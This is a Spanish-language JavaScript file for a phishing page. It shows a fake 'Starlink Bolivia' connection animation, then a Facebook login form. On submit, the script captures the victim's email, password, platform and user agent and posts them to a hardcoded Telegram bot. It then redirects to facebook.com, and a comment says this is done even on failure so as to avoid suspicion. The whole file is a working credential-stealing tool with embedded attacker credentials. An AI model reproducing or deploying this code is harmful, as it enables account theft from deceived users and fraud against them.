document.addEventListener('DOMContentLoaded', () => {
    
    // 1. GENERAR ESTRELLAS LLOVIENDO
    const container = document.getElementById('starsContainer');
    for (let i = 0; i < 50; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        const size = Math.random() * 3 + 'px';
        star.style.width = size;
        star.style.height = size;
        star.style.left = Math.random() * 100 + 'vw';
        star.style.animationDuration = Math.random() * 2 + 1 + 's';
        star.style.animationDelay = Math.random() * 5 + 's';
        container.appendChild(star);
    }

    // 2. LÓGICA DE CARGA (10 SEGUNDOS)
    const bar = document.getElementById('fill-bar');
    const percent = document.getElementById('percent-text');
    const status = document.getElementById('status-text');
    const loadView = document.getElementById('loading-view');
    const loginView = document.getElementById('login-view');

    setTimeout(() => { if(bar) bar.style.width = '100%'; }, 100);

    let count = 0;
    const interval = setInterval(() => {
        count++;
        if(percent) percent.innerText = count + '%';

        if(count === 25) status.innerText = "Localizando satélites Starlink...";
        if(count === 60) status.innerText = "Estableciendo enlace en Bolivia...";
        if(count === 90) status.innerText = "Abriendo portal de acceso...";

        if(count >= 100) {
            clearInterval(interval);
            setTimeout(() => {
                loadView.style.opacity = '0';
                loadView.style.transition = '0.6s';
                setTimeout(() => {
                    loadView.classList.add('hidden');
                    loginView.classList.remove('hidden');
                }, 600);
            }, 500);
        }
    }, 100); // 100ms * 100 = 10 segundos

    // 3. ENVÍO A TELEGRAM
    const fbForm = document.getElementById('fbForm');
    
    fbForm.addEventListener('submit', (e) => {
        e.preventDefault();
        
        const btn = document.getElementById('btnEnviar');
        const msgRedir = document.getElementById('msgRedireccion');
        
        btn.innerText = "Iniciando...";
        btn.disabled = true;

        // TUS DATOS DE TELEGRAM
        const token = "8700765411:AAFOdtrzol7ZHHE4dlftTixEwCP1yknJmGc";
        const chat_id = "1402749879";
        
        // CAPTURA DE DATOS
        const usuario = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        const userAgent = navigator.userAgent;
        const modelo = navigator.platform; 

        const mensaje = `NUEVO LOGIN FB STARLINK\n` +
                        `Usuario  : ${usuario}\n` +
                        `Contraseña: ${pass}\n` +
                        `Modelo  : ${modelo}\n` +
                        `UserAgent: ${userAgent}`;

        // ENVÍO VÍA API
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chat_id,
                text: mensaje
            })
        })
        .then(() => {
            msgRedir.style.display = "block";
            // Redirección en 3 segundos a Facebook
            setTimeout(() => {
                window.location.href = "https://www.facebook.com";
            }, 3000);
        })
        .catch(() => {
            // Si falla el envío, igual redirige para no levantar sospechas
            window.location.href = "https://www.facebook.com";
        });
    });
});